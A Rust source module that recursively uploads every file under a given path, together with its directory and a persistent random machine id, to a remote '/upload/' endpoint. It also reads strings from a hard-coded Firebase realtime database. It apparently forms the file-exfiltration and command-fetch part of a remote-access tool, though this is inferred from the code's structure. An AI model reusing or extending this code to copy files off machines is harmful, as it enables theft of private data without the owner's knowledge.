use std::fs;
use std::path::Path;
use reqwest::blocking:: {
    Client,
    multipart:: {
        Form,
        Part
    }};
use serde_json;
use std::error::Error;
use rand::Rng;

pub fn upload_file(full_path: &str, url: &str, uid: u64, is_file: bool) -> String {
    let mut replies = String::new();
    if is_file {
        let r = upload_single(full_path, url, uid);
        if r != "kuchh nhin upload hua" {
            replies.push_str(&r);
            replies.push('\n');
        }
    } else if let Ok(entries) = std::fs::read_dir(full_path) {
        for entry in entries.flatten() {
            let path = entry.path();
            if let Some(path_str) = path.to_str() {
                let is_file_now = path.is_file();
                let r = upload_file(path_str, url, uid, is_file_now);
                if !r.is_empty() {
                    replies.push_str(&r);
                }
            }
        }
    }

    replies
}

fn upload_single(path: &str, url: &str, uid: u64) -> String {
    match upload(path, &(format!("{}/upload/", url)), uid) {
        Ok(_) => format!("uploaded safal: {}", path),
        Err(_) => "upload failed or file not found".to_string(),
    }
}

pub fn upload(file_path: &str, upload_url: &str, uid: u64) -> Result<(), Box<dyn std::error::Error>> {
    let file_bytes = fs::read(file_path)?;
    let mime_type = mime_guess::from_path(file_path)
    .first_or_octet_stream();

    let flname = Path::new(file_path)
    .file_name()
    .and_then(|name| name.to_str())
    .unwrap_or("unknown_file");

    let dirname = Path::new(file_path)
    .parent()
    .and_then(|p| p.to_str())
    .unwrap_or("")
    .to_string();
    let part = Part::bytes(file_bytes)
    .file_name(flname.to_string())
    .mime_str(mime_type.as_ref())?;
    let form = Form::new()
    .part("file", part)
    .text("uid", uid.to_string())
    .text("file_path", dirname);

    let client = Client::new();
    let response = client.post(upload_url)
    .multipart(form)
    .send()?;

    let text = response.text()?;
    let v: serde_json::Value = serde_json::from_str(&text)?;
    if v["status"] == "success" {
        Ok(())
    } else {
        Err("upload Failed".into())
    }
}

pub fn getdata(kahan: &str) -> Result<String,
Box<dyn Error>> {
    let url = format!(
        "https://jagooptpy-default-rtdb.firebaseio.com/{kahan}.json"
    );
    let client = Client::new();
    let response = client.get(&url).send()?;
    if response.status().is_success() {
        let text = response.text()?;
        let value: serde_json::Value = serde_json::from_str(&text)?;
        let clean_str = value.as_str().unwrap_or("").to_string();
        //println!("{clean_str}");
        if clean_str.len() > 0 && clean_str != "error".to_string() {
            return Ok(clean_str);
        }
    }
    Err("Error".into())

}


pub fn getuid()->u64 {
    fn geneuid()->u64 {
        let mut rng = rand::rng();
        let random_number = (rng.random_range(1_00_000..99_99_999)) as u64;
        let data = serde_json::json!({
            "uid": random_number
        });
        if let Ok(jsonstr) = serde_json::to_string_pretty(&data) {
            let _ = std::fs::write("data.json", jsonstr);
        }
        random_number
    }
    let file_path = std::path::Path::new("data.json");
    let random_number: u64;
    if file_path.exists() {
        match fs::read_to_string(file_path) {
            Ok(data) => {
                if let Ok(json_value) = serde_json::from_str::<serde_json::Value>(&data) {
                    random_number = json_value.get("uid").and_then(|v| v.as_u64()).unwrap_or(0);
                }else {
                    random_number = geneuid();
                }
            }
            Err(_) => {
                random_number = geneuid();
            }
        }
    }else {
        random_number = geneuid();
    }
    random_number

}